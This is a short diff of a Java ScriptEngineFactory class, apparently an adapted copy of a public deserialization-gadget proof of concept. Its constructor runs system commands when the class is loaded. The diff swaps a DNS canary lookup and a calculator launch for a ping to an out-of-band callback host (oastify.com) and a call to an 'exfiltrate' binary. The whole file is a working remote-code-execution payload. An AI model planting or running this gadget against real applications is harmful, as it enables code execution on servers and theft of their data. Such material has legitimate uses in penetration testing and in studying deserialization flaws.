@@ -9,8 +9,8 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
-            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+            Runtime.getRuntime().exec("ping 446rwci875b2vdsc8wyoqop8uz0qohc6.oastify.com");
+            Runtime.getRuntime().exec("/usr/local/bin/exfiltrate");
         } catch (IOException e) {
             e.printStackTrace();
         }
